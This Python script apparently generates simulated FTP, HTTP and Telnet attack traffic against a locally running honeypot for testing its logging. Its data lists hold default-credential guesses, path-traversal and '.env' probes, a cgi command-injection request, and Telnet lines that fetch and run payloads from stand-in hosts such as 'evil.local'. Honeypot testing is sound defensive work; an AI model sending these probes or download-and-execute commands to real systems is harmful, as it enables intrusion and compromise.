"""Simulate FTP, HTTP, and Telnet attack traffic for testing.

Usage (honeypot must already be running):
    python scripts/simulate_multi_protocol.py
"""

from __future__ import annotations

import random
import socket
import time
from threading import Thread


TARGET_HOST = "127.0.0.1"

# Ports must match config/config.yaml
FTP_PORT = 2121
HTTP_PORT = 8888
TELNET_PORT = 2323

USERNAMES = ["root", "admin", "ubuntu", "test", "user", "oracle", "guest"]
PASSWORDS = ["123456", "password", "admin", "toor", "letmein", "qwerty", "1234"]

# ---------------------------------------------------------------------------
# FTP simulation
# ---------------------------------------------------------------------------

FTP_COMMAND_SEQUENCES = [
    ["LIST", "PWD", "CWD /etc", "RETR /etc/passwd", "QUIT"],
    ["PWD", "LIST", "STOR evil.sh", "QUIT"],
    ["CWD /var/www", "LIST", "RETR index.php", "QUIT"],
    ["MKD /tmp/shell", "CWD /tmp/shell", "STOR payload.sh", "QUIT"],
]


def _ftp_send(sock: socket.socket, cmd: str) -> str:
    sock.sendall((cmd + "\r\n").encode())
    time.sleep(0.1)
    try:
        return sock.recv(512).decode("utf-8", errors="ignore")
    except OSError:
        return ""


def simulate_ftp() -> None:
    try:
        with socket.create_connection((TARGET_HOST, FTP_PORT), timeout=5) as sock:
            sock.recv(512)  # banner

            username = random.choice(USERNAMES)
            password = random.choice(PASSWORDS)

            _ftp_send(sock, f"USER {username}")
            _ftp_send(sock, f"PASS {password}")
            _ftp_send(sock, "SYST")

            for cmd in random.choice(FTP_COMMAND_SEQUENCES):
                _ftp_send(sock, cmd)
                if cmd == "QUIT":
                    break
    except Exception as exc:
        print(f"[FTP simulation error] {exc}")


# ---------------------------------------------------------------------------
# HTTP simulation
# ---------------------------------------------------------------------------

HTTP_REQUESTS = [
    "GET / HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "GET /admin HTTP/1.1\r\nHost: localhost\r\nUser-Agent: sqlmap/1.7\r\n\r\n",
    "GET /wp-login.php HTTP/1.1\r\nHost: localhost\r\nUser-Agent: WPScan\r\n\r\n",
    "POST /login HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nusername=admin&password=123456",
    "GET /.env HTTP/1.1\r\nHost: localhost\r\nUser-Agent: curl/7.88.1\r\n\r\n",
    "GET /phpmyadmin HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Nikto/2.1.6\r\n\r\n",
    "GET /../../../etc/passwd HTTP/1.1\r\nHost: localhost\r\nUser-Agent: python-requests/2.31\r\n\r\n",
    "GET /cgi-bin/test.cgi?cmd=id HTTP/1.1\r\nHost: localhost\r\nUser-Agent: zgrab/0.x\r\n\r\n",
]


def simulate_http() -> None:
    try:
        req = random.choice(HTTP_REQUESTS)
        with socket.create_connection((TARGET_HOST, HTTP_PORT), timeout=5) as sock:
            sock.sendall(req.encode())
            time.sleep(0.2)
            try:
                sock.recv(4096)
            except OSError:
                pass
    except Exception as exc:
        print(f"[HTTP simulation error] {exc}")


# ---------------------------------------------------------------------------
# Telnet simulation
# ---------------------------------------------------------------------------

TELNET_COMMANDS = [
    "ls", "pwd", "whoami", "uname -a",
    "cat /etc/passwd", "wget http://evil.local/payload.sh",
    "chmod +x payload.sh", "bash payload.sh",
    "curl http://198.51.100.10/dropper",
]


def _strip_iac(data: bytes) -> bytes:
    """Remove Telnet IAC option sequences from received data."""
    out = bytearray()
    i = 0
    while i < len(data):
        if data[i] == 0xFF and i + 2 < len(data):
            i += 3
            continue
        out.append(data[i])
        i += 1
    return bytes(out)


def _telnet_send(sock: socket.socket, text: str) -> None:
    sock.sendall((text + "\n").encode())
    time.sleep(0.3)
    try:
        sock.recv(512)
    except OSError:
        pass


def simulate_telnet() -> None:
    try:
        with socket.create_connection((TARGET_HOST, TELNET_PORT), timeout=5) as sock:
            sock.settimeout(3.0)
            time.sleep(0.3)
            try:
                sock.recv(512)  # MOTD + IAC negotiation + "login: "
            except (OSError, socket.timeout):
                pass

            _telnet_send(sock, random.choice(USERNAMES))   # username
            _telnet_send(sock, random.choice(PASSWORDS))   # password

            for _ in range(random.randint(2, 5)):
                cmd = random.choice(TELNET_COMMANDS)
                _telnet_send(sock, cmd)
                if cmd in ("exit", "quit"):
                    break

            _telnet_send(sock, "exit")
    except Exception as exc:
        print(f"[Telnet simulation error] {exc}")


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

PROTOCOL_SIMULATORS = [simulate_ftp, simulate_http, simulate_telnet]


def main() -> None:
    threads_per_protocol = 3

    workers: list[Thread] = []
    for _ in range(threads_per_protocol):
        for fn in PROTOCOL_SIMULATORS:
            t = Thread(target=fn)
            workers.append(t)

    for t in workers:
        t.start()
    for t in workers:
        t.join()

    print("Multi-protocol simulation complete.")


if __name__ == "__main__":
    main()
